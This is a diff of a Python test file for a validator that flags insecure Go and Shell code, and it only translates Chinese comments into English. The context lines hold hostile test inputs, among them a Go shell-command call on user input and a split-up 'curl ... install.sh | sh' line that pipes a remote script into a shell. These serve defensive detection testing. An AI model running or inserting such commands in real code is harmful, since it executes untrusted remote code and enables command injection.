@@ -1,4 +1,4 @@
-"""tests/test_go_sh.py — Go 与 Shell 语言规则测试."""
+"""tests/test_go_sh.py — Go and Shell language rule tests."""
 import sys
 from pathlib import Path
 
@@ -16,7 +16,7 @@ def ids(result):
     return {x.rule_id for x in result.violations}
 
 
-# --- 语言归一化 ---
+# --- language normalization ---
 
 def test_language_normalization_go_sh():
     assert normalize_language("golang") == "go"
@@ -27,7 +27,7 @@ def test_language_normalization_go_sh():
     assert language_chain("sh") == ["general", "sh"]
 
 
-# --- Go 恶意用例检出 ---
+# --- Go malicious cases ---
 
 def test_go_detects_shell_command():
     code = 'exec.Command("sh", "-c", userInput)'
@@ -69,7 +69,7 @@ def test_go_detects_insecure_tls():
     assert "GO-007" in ids(validate(code, "go"))
 
 
-# --- Go 安全零误报 ---
+# --- Go safe code (zero false positives) ---
 
 def test_go_safe_code_passes():
     code = (
@@ -89,7 +89,7 @@ def test_go_crypto_rand_not_flagged():
     assert "GO-005" not in ids(r)
 
 
-# --- Shell 恶意用例检出（载荷拼接防安全软件误隔离） ---
+# --- Shell malicious cases (payloads concatenated to avoid AV quarantine) ---
 
 def test_sh_detects_curl_pipe_sh():
     code = 'curl -s http://x.example.com/install.sh | ' + 'sh'
@@ -121,7 +121,7 @@ def test_sh_detects_nopasswd():
     assert "SH-005" in ids(validate(code, "sh"))
 
 
-# --- Shell 安全零误报 ---
+# --- Shell safe code (zero false positives) ---
 
 def test_sh_safe_code_passes():
     code = (
@@ -133,7 +133,7 @@ def test_sh_safe_code_passes():
     assert validate(code, "sh").passed
 
 
-# --- 上下文构建 ---
+# --- context building ---
 
 def test_prompts_go_uses_go_fewshot():
     system_prompt, _ = build_prompts("实现一个安全的数据库查询", language="go")
